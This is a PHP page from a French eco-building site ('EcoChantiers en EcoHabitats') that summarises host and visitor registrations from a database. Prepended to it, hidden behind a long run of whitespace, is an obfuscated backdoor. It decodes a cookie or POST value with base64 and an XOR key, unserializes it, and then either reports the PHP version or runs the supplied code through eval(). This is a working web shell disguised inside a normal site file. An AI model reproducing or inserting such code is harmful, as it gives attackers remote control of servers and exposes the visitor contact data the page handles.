<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $j99ea5d6 = 340;$GLOBALS['be6806e4']=Array();global$be6806e4;$be6806e4=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['p4f64c']="\x3e\x70\x60\x53\x69\x46\x6e\x52\x67\x37\x42\x55\x3c\x7b\x4e\x20\x77\x38\x7d\x4d\x25\x2f\x4a\x21\x2b\x66\x32\x30\x59\x61\x23\x54\x7e\x73\x33\x5c\x5d\x3d\x29\xa\x2d\x68\x75\x34\x36\x49\x27\x64\x2c\x56\x44\x62\x2e\x50\x31\x6b\x28\x22\x39\x63\x6c\x47\x76\x45\x6d\x79\x57\x35\x72\x7c\x2a\x40\x5b\x43\x74\x48\x78\x51\x3a\x5a\x4b\x3f\x9\x41\x6f\x58\x65\x24\x7a\x4f\x71\x3b\x5e\x4c\x5f\x6a\xd\x26";$be6806e4[$be6806e4['p4f64c'][4].$be6806e4['p4f64c'][54].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][17].$be6806e4['p4f64c'][17].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][26].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][51]]=$be6806e4['p4f64c'][59].$be6806e4['p4f64c'][41].$be6806e4['p4f64c'][68];$be6806e4[$be6806e4['p4f64c'][62].$be6806e4['p4f64c'][25].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][44].$be6806e4['p4f64c'][59]]=$be6806e4['p4f64c'][84].$be6806e4['p4f64c'][68].$be6806e4['p4f64c'][47];$be6806e4[$be6806e4['p4f64c'][55].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][27].$be6806e4['p4f64c'][27]]=$be6806e4['p4f64c'][33].$be6806e4['p4f64c'][74].$be6806e4['p4f64c'][68].$be6806e4['p4f64c'][60].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][6];$be6806e4[$be6806e4['p4f64c'][33].$be6806e4['p4f64c'][44].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][86]]=$be6806e4['p4f64c'][4].$be6806e4['p4f64c'][6].$be6806e4['p4f64c'][4].$be6806e4['p4f64c'][94].$be6806e4['p4f64c'][33].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][74];$be6806e4[$be6806e4['p4f64c'][95].$be6806e4['p4f64c'][34].$be6806e4['p4f64c'][27].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][51].$be6806e4['p4f64c'][34].$be6806e4['p4f64c'][54].$be6806e4['p4f64c'][27]]=$be6806e4['p4f64c'][33].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][68].$be6806e4['p4f64c'][4].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][60].$be6806e4['p4f64c'][4].$be6806e4['p4f64c'][88].$be6806e4['p4f64c'][86];$be6806e4[$be6806e4['p4f64c'][65].$be6806e4['p4f64c'][58].$be6806e4['p4f64c'][67].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][29]]=$be6806e4['p4f64c'][1].$be6806e4['p4f64c'][41].$be6806e4['p4f64c'][1].$be6806e4['p4f64c'][62].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][68].$be6806e4['p4f64c'][33].$be6806e4['p4f64c'][4].$be6806e4['p4f64c'][84].$be6806e4['p4f64c'][6];$be6806e4[$be6806e4['p4f64c'][90].$be6806e4['p4f64c'][25].$be6806e4['p4f64c'][27].$be6806e4['p4f64c'][17].$be6806e4['p4f64c'][54].$be6806e4['p4f64c'][17].$be6806e4['p4f64c'][59].$be6806e4['p4f64c'][34]]=$be6806e4['p4f64c'][42].$be6806e4['p4f64c'][6].$be6806e4['p4f64c'][33].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][68].$be6806e4['p4f64c'][4].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][60].$be6806e4['p4f64c'][4].$be6806e4['p4f64c'][88].$be6806e4['p4f64c'][86];$be6806e4[$be6806e4['p4f64c'][65].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][34].$be6806e4['p4f64c'][25]]=$be6806e4['p4f64c'][51].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][33].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][44].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][94].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][59].$be6806e4['p4f64c'][84].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][86];$be6806e4[$be6806e4['p4f64c'][64].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][59].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][17]]=$be6806e4['p4f64c'][33].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][74].$be6806e4['p4f64c'][94].$be6806e4['p4f64c'][74].$be6806e4['p4f64c'][4].$be6806e4['p4f64c'][64].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][94].$be6806e4['p4f64c'][60].$be6806e4['p4f64c'][4].$be6806e4['p4f64c'][64].$be6806e4['p4f64c'][4].$be6806e4['p4f64c'][74];$be6806e4[$be6806e4['p4f64c'][1].$be6806e4['p4f64c'][44].$be6806e4['p4f64c'][26].$be6806e4['p4f64c'][43]]=$be6806e4['p4f64c'][88].$be6806e4['p4f64c'][44].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][26].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][58].$be6806e4['p4f64c'][26].$be6806e4['p4f64c'][27];$be6806e4[$be6806e4['p4f64c'][64].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][51].$be6806e4['p4f64c'][26].$be6806e4['p4f64c'][26].$be6806e4['p4f64c'][26]]=$be6806e4['p4f64c'][68].$be6806e4['p4f64c'][25].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][17];$be6806e4[$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][27].$be6806e4['p4f64c'][44].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][17].$be6806e4['p4f64c'][17]]=$_POST;$be6806e4[$be6806e4['p4f64c'][4].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][25].$be6806e4['p4f64c'][25]]=$_COOKIE;@$be6806e4[$be6806e4['p4f64c'][33].$be6806e4['p4f64c'][44].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][86]]($be6806e4['p4f64c'][86].$be6806e4['p4f64c'][68].$be6806e4['p4f64c'][68].$be6806e4['p4f64c'][84].$be6806e4['p4f64c'][68].$be6806e4['p4f64c'][94].$be6806e4['p4f64c'][60].$be6806e4['p4f64c'][84].$be6806e4['p4f64c'][8],NULL);@$be6806e4[$be6806e4['p4f64c'][33].$be6806e4['p4f64c'][44].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][86]]($be6806e4['p4f64c'][60].$be6806e4['p4f64c'][84].$be6806e4['p4f64c'][8].$be6806e4['p4f64c'][94].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][68].$be6806e4['p4f64c'][68].$be6806e4['p4f64c'][84].$be6806e4['p4f64c'][68].$be6806e4['p4f64c'][33],0);@$be6806e4[$be6806e4['p4f64c'][33].$be6806e4['p4f64c'][44].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][86]]($be6806e4['p4f64c'][64].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][76].$be6806e4['p4f64c'][94].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][76].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][59].$be6806e4['p4f64c'][42].$be6806e4['p4f64c'][74].$be6806e4['p4f64c'][4].$be6806e4['p4f64c'][84].$be6806e4['p4f64c'][6].$be6806e4['p4f64c'][94].$be6806e4['p4f64c'][74].$be6806e4['p4f64c'][4].$be6806e4['p4f64c'][64].$be6806e4['p4f64c'][86],0);@$be6806e4[$be6806e4['p4f64c'][64].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][59].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][17]](0);$gec971a0c=NULL;$fdc7=NULL;$be6806e4[$be6806e4['p4f64c'][74].$be6806e4['p4f64c'][25].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][51]]=$be6806e4['p4f64c'][17].$be6806e4['p4f64c'][58].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][17].$be6806e4['p4f64c'][34].$be6806e4['p4f64c'][51].$be6806e4['p4f64c'][54].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][40].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][40].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][25].$be6806e4['p4f64c'][59].$be6806e4['p4f64c'][26].$be6806e4['p4f64c'][40].$be6806e4['p4f64c'][58].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][17].$be6806e4['p4f64c'][67].$be6806e4['p4f64c'][40].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][58].$be6806e4['p4f64c'][25].$be6806e4['p4f64c'][67].$be6806e4['p4f64c'][17].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][54].$be6806e4['p4f64c'][67].$be6806e4['p4f64c'][59].$be6806e4['p4f64c'][17].$be6806e4['p4f64c'][25].$be6806e4['p4f64c'][44];global$tfab;function rfa8($gec971a0c,$l5efac70){global$be6806e4;$xb5c8="";for($t6f08d5eb=0;$t6f08d5eb<$be6806e4[$be6806e4['p4f64c'][55].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][27].$be6806e4['p4f64c'][27]]($gec971a0c);){for($t03d90=0;$t03d90<$be6806e4[$be6806e4['p4f64c'][55].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][27].$be6806e4['p4f64c'][27]]($l5efac70)&&$t6f08d5eb<$be6806e4[$be6806e4['p4f64c'][55].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][27].$be6806e4['p4f64c'][27]]($gec971a0c);$t03d90++,$t6f08d5eb++){$xb5c8.=$be6806e4[$be6806e4['p4f64c'][4].$be6806e4['p4f64c'][54].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][17].$be6806e4['p4f64c'][17].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][26].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][51]]($be6806e4[$be6806e4['p4f64c'][62].$be6806e4['p4f64c'][25].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][44].$be6806e4['p4f64c'][59]]($gec971a0c[$t6f08d5eb])^$be6806e4[$be6806e4['p4f64c'][62].$be6806e4['p4f64c'][25].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][44].$be6806e4['p4f64c'][59]]($l5efac70[$t03d90]));}}return$xb5c8;}function z6d2d920($gec971a0c,$l5efac70){global$be6806e4;global$tfab;return$be6806e4[$be6806e4['p4f64c'][64].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][51].$be6806e4['p4f64c'][26].$be6806e4['p4f64c'][26].$be6806e4['p4f64c'][26]]($be6806e4[$be6806e4['p4f64c'][64].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][51].$be6806e4['p4f64c'][26].$be6806e4['p4f64c'][26].$be6806e4['p4f64c'][26]]($gec971a0c,$tfab),$l5efac70);}foreach($be6806e4[$be6806e4['p4f64c'][4].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][25].$be6806e4['p4f64c'][25]]as$l5efac70=>$yd1fc6){$gec971a0c=$yd1fc6;$fdc7=$l5efac70;}if(!$gec971a0c){foreach($be6806e4[$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][27].$be6806e4['p4f64c'][44].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][9].$be6806e4['p4f64c'][17].$be6806e4['p4f64c'][17]]as$l5efac70=>$yd1fc6){$gec971a0c=$yd1fc6;$fdc7=$l5efac70;}}$gec971a0c=@$be6806e4[$be6806e4['p4f64c'][90].$be6806e4['p4f64c'][25].$be6806e4['p4f64c'][27].$be6806e4['p4f64c'][17].$be6806e4['p4f64c'][54].$be6806e4['p4f64c'][17].$be6806e4['p4f64c'][59].$be6806e4['p4f64c'][34]]($be6806e4[$be6806e4['p4f64c'][1].$be6806e4['p4f64c'][44].$be6806e4['p4f64c'][26].$be6806e4['p4f64c'][43]]($be6806e4[$be6806e4['p4f64c'][65].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][34].$be6806e4['p4f64c'][25]]($gec971a0c),$fdc7));if(isset($gec971a0c[$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][55]])&&$tfab==$gec971a0c[$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][55]]){if($gec971a0c[$be6806e4['p4f64c'][29]]==$be6806e4['p4f64c'][4]){$t6f08d5eb=Array($be6806e4['p4f64c'][1].$be6806e4['p4f64c'][62]=>@$be6806e4[$be6806e4['p4f64c'][65].$be6806e4['p4f64c'][58].$be6806e4['p4f64c'][67].$be6806e4['p4f64c'][86].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][29].$be6806e4['p4f64c'][29]](),$be6806e4['p4f64c'][33].$be6806e4['p4f64c'][62]=>$be6806e4['p4f64c'][54].$be6806e4['p4f64c'][52].$be6806e4['p4f64c'][27].$be6806e4['p4f64c'][40].$be6806e4['p4f64c'][54],);echo@$be6806e4[$be6806e4['p4f64c'][95].$be6806e4['p4f64c'][34].$be6806e4['p4f64c'][27].$be6806e4['p4f64c'][47].$be6806e4['p4f64c'][43].$be6806e4['p4f64c'][51].$be6806e4['p4f64c'][34].$be6806e4['p4f64c'][54].$be6806e4['p4f64c'][27]]($t6f08d5eb);}elseif($gec971a0c[$be6806e4['p4f64c'][29]]==$be6806e4['p4f64c'][86]){eval/*zb12841ed*/($gec971a0c[$be6806e4['p4f64c'][47]]);}exit();} ?>﻿<?php
//ob_start('ob_gzhandler');
include ('defineInc.php');
include ('dbInc.php');
include ('writeTabInc.php');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html dir="ltr" xml:lang="fr" xmlns="http://www.w3.org/1999/xhtml" lang="fr">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<title>EcoChantiers en EcoHabitats - Récapitulatif hotes</title>
	<meta name="generator" content="DokuWiki Release 2009-12-25c &quot;Lemming&quot;" />
	<meta name="robots" content="noindex" />
	<meta name="date" content="2014-09-21T13:00:00+0000" />
	<meta name="keywords" content="alterenergies,accueil" />
	<link rel="search" type="application/opensearchdescription+xml" href="http://www.alterenergies.org/lib/exe/opensearch.php" title="Alter'énergies" />
	<link rel="start" href="http://www.alterenergies.org/" />
	<link rel="contents" href="http://www.alterenergies.org/doku.php?id=alterenergies:accueil&amp;do=index" title="Index" />
	<link rel="canonical" href="http://www.alterenergies.org/doku.php?id=alterenergies:accueil" />
	<link rel="stylesheet" media="screen" type="text/css" href="css/css.css?v=<?php echo filemtime('css/css.css');?>" />
	<link rel="stylesheet" media="print" type="text/css" href="css/print.css?v=<?php echo filemtime('css/print.css');?>" />
	<link rel="stylesheet" type="text/css" href="css/font.css" />
	<script type="text/javascript" src="lib/prototype.js"></script>
	<script type="text/javascript" charset="utf-8" src="js/core.js"></script>
	<script type="text/javascript" charset="utf-8" src="js/recap.js"></script>
	<link rel="icon" type="image/png" href="gfx/favicon.png" />
	<!--	Correctif pour l'affichage de #contenu-page dans IE6 qui ne connait pas les contextes de formatage :
http://css.alsacreations.com/Faire-une-mise-en-page-sans-tableaux/design-trois-colonnes-positionnement-flottant
		Et autres...
	-->
	<!--[if lte IE 6]>
	<style type="text/css">
	#page-contenu {
		overflow: visible;
		height:1px;
	}
	#sommaire-gauche {
		margin-left:4px;
	}
	#bandeau {
		overflow: visible;
		border-bottom:0;
	}
	#titre-alterenergies {
		border-bottom:1px solid #036bc2;
	}
	#page-edition-arriere-plan{
		//overflow:visible;
	}
	#page-edition{width:100%;}
	.footerinc{overflow:visible;}
	div.dokuwiki{overflow:hidden;}
	</style>
	<![endif]-->
</head>
<body>
<div class="eceh">
	<div id="bandeau">
		<?php include ('headerInc.php'); ?>
	</div>
		<?php echo $DEF_ACCUEIL_H; // bouton deconnexion haut et bas ?>	
	<!-- DIV utilisé pour faire le dégradé derrière #nos-services, #page-content, #page-edition  -->
	<div id="conteneur-degrade">	
		<div id="trois-colonnes">
			<div id="participants">
				<?php include ('writeHoteInc.php'); ?>          
<!--        <li class="level1"><div class="li"><a class="participants">Mathieu Sabin (10 p.)<br> Le Petit Pressigny</a></div></li>
            <li class="level1"><div class="li"><a class="participants">Stephane Artous (15 p.)<br> Preuilly sur Claise</a></div></li>-->  
			</div> <!-- Fin #colonne-participants -->
			<div id="colonne-droite">
				<?php include ('partenInc.php'); ?>
      		</div><!-- Fin de #colonne-droite -->
			<div id="page-contenu">
				<div class='recap'>
<?php
  $creneau[1] = $DEF_SAMAM;
  $creneau[2] = $DEF_SAMPM;
  $creneau[3] = $DEF_DIMAM;   
  $creneau[4] = $DEF_DIMPM; 
  $creneau[5] = $DEF_SAM2AM;
  $creneau[6] = $DEF_SAM2PM;
  $creneau[7] = $DEF_DIM2AM;   
  $creneau[8] = $DEF_DIM2PM; 
 
  echo "<p class=\"titre\">Résumé des inscriptions :</p>";
  echo "<div class='level2 resinsc futuraCL'>";
  $total = 0;
  $totali = 0;
  for ($i = 1; $i < 9; ++$i) {
    $sql_S = 'SELECT SUM(nb_pers), COUNT(*)  FROM '.$s_tablePrefix.'eceh_inscription WHERE creneau='.$i;
    $query = mysql_query($sql_S) or die ("<br>erreur sur : " . $sql_S);  
    if ($data = mysql_fetch_row($query))
    {
      $plrIns = $data[1] > 1 ?"s":"";
      $plrVis = $data[0] > 1 ?"s":"";
      $vis = $data[0] ? $data[0] : 0;
      echo $creneau[$i]." : <span class=\"futuraC\">".$data[1]."</span> inscrit".$plrIns.", <span class=\"futuraC\">".$vis."</span> visiteur".$plrVis."<br />";
      $total += $data[0];
      $totali += $data[1];
    }
	mysql_free_result($query);
  }
  echo "</div><div class='tot futuraC'>total inscrits : ".$totali." p. - ";
  echo "total visites : ".$total." p.</div>";
  echo "<p class=\"titre\">Détail des inscriptions :</p>";
  echo "<div class='level2'>";

  $sql_S = 'SELECT * FROM '.$s_tablePrefix.'eceh_hote ORDER BY id';
  $query = mysql_query($sql_S) or die ("<br>erreur sur : " . $sql_S);  
  echo "<ul>";
  while ($data = mysql_fetch_array($query))
  {
    if ($data["ordre_aff"] <> 0)
    {
      echo "<li class=\"nom_recap\">" . $data["nom"] . "</li>";
      $row = "";
      for ($i = 1; $i < 9; $i++)
      {
      $flag = 0;
          $sql2_S = 'SELECT SUM(nb_pers) FROM '.$s_tablePrefix.'eceh_inscription WHERE id_h = '.$data['id'].' AND creneau='.$i;
          $query2 = mysql_query($sql2_S) or die ("<br>erreur sur : " . $sql2_S);  
          if ($data2 = mysql_fetch_array($query2))
            $total = $data2[0];
          mysql_free_result($query2);
      $places = $i == 1 ? $data["placesSamAM"] : ($i == 2 ? $data["placesSamPM"] : ($i == 3 ? $data["placesDimAM"] : ($i == 4 ? $data["placesDimPM"] : ($i == 5 ? $data["placesSam2AM"] : ($i == 6 ? $data["placesSam2PM"] : ($i == 7 ? $data["placesDim2AM"] : ($i == 8 ? $data["placesDim2PM"] : 0)))))));
      
          $row = "<div class='level2'><li class='creneau'>" . $creneau[$i] . " (".$total." p. / ".$places."p.)</li><div class='level1 futuraC'>";
        $sql3_S = 'SELECT *, DATE_FORMAT('.$s_tablePrefix.'eceh_inscription.date, "%e %b %y (%l:%i)") as dateI FROM '.$s_tablePrefix.'eceh_inscription, '.$s_tablePrefix.'eceh_visiteur WHERE id = id_v AND id_h = '.$data['id'].' AND creneau='.$i;
        $query3 = mysql_query($sql3_S) or die ("<br>erreur sur : " . $sql3_S);  
        while ($data3 = mysql_fetch_array($query3))
        {
          $flag++;
          $row .= ucwords($data3['prenom'])." ".strtoupper($data3['nom'])." - ".$data3['nb_pers']." p. (<span class='it'>".$data3['mail'] . " - " . $data3['tel'] ."</span>)<br />";
        }
      mysql_free_result($query3);
        $row .= "</div></div>";
        if ($flag)
          echo $row;
      }
    }
  }
  mysql_free_result($query);
  echo "</ul></div>";
?>
		</div>
	  </div><!-- Fin de #page-contenu -->
	</div><!-- fin DIV #deux-colonnes -->
	<div style="clear: both;">
		<?php echo $DEF_ACCUEIL_B; // bouton deconnexion haut et bas ?>	
	</div><!-- fin DIV pour dégradé #conteneur-degrade -->
	<div style="clear: both;"></div>
	<?php include ('footerInc.php'); ?>
</div>
</div>
<div id="scroll-bar" style="display:none;">
	<a id="scroll-bar-a" href="#" title="Haut de page"><span></span>Haut de page</a>
</div>
</body>
</html>
<?php //ob_end_flush(); ?>